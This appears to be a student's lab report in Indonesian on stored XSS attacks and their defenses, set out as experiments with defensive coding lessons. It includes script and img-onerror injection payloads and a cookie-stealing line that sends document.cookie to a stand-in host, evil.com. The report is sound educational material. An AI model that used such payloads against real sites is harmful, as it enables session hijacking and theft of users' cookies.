# XSS Attack & Defense

## EXPERIMENT 1: Stored XSS Attack
`<script>alert('XSS!')</script>` \
Browser alert berisi "XSS!" muncul. \
<br />
![eksperimen1](screenshots/Eksperimen%201/1.png)

## EXPERIMENT 2: Image Tag XSS
`<img src="x" onerror="alert('XSS via img!')">` \
Browser alert berisi "XSS via img!" muncul. \
<br />
![eksperimen2](screenshots/Eksperimen%202/2.png) \
<br />
HTML memiliki event hook bawaan yang secara implisit mengeksekusi JavaScript. \
`onerror`, `onclick`, `onload`, dan sebagainya adalah titik eksekusi JavaScript.

## EXPERIMENT 3: Cookie Stealing Simulation
`<img src="x" onerror="alert('Cookie: ' + document.cookie)">` \
Browser akan memunculkan cookie user di alert. \
<br />
![eksperimen3](screenshots/Eksperimen%203/3.png) \
<br />
Jika `alert()` diganti dengan `fetch('https://evil.com?cookie=' + document.cookie)`, akan muncul error. \
<br />
![eksperimen3a](screenshots/Eksperimen%203/3a.png)

## EXPERIMENT 4: DOM Manipulation
`<img src="x" onerror="document.body.style.background='red'">` \
Halaman background akan berubah menjadi warna merah. \
<br />
![eksperimen4](screenshots/Eksperimen%204/4.png)

## EXPERIMENT 5: Versi Secure
Semua payload yang dijalankan dari keempat eksperimen sebelumnya tidak berfungsi. (Aman dari XSS!) \
<br />
![eksperimen5](screenshots/Eksperimen%205/5.png)

## EXPERIMENT 6: Bandingkan Kode
Memperhatikan perbedaan kode antara vulnerable dan secure:
```
// VULNERABLE
container.innerHTML = `<div>${userInput}</div>`;

// SECURE
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);
```
Dalam kode vulnerable, input pengguna diperlakukan sebagai HTML / JavaScript sehingga browser membaca input tersebut sebagai kode yang bisa dijalankan. \
Sedangkan, dalam kode secure, input pengguna tidak diperlakukan sebagai kode dan hanya menampilkan tulisan apa adanya, sehingga browser tidak menjalankan kode.

## PERTANYAAN REFLEKSI
1. **Mengapa `<img onerror>` bisa menjalankan JavaScript?** \
Event `onerror` adalah titik eksekusi JavaScript saat gambar gagal dimuat.
2. **Apa perbedaan antara Stored XSS dan Reflected XSS dari perspektif attacker?** \
Stored XSS disimpan di server dan menyerang banyak user; Reflected XSS hanya berjalan saat user membuka link khusus.
3. **Mengapa HttpOnly cookie penting dalam konteks XSS?** \
HttpOnly cookie penting karena mencegah JavaScript mencuri cookie meski terjadi serangan XSS.
4. **Jika kamu perlu menampilkan rich text (dengan formatting), bagaimana caranya agar tetap aman?** \
Men-sanitize HTML menggunakan library terpercaya sebelum ditampilkan.
5. **Apa kegunaan Content Security Policy (CSP) header?** \
CSP Header berguna untuk membatasi sumber dan cara JavaScript dijalankan agar XSS tidak bisa dieksekusi.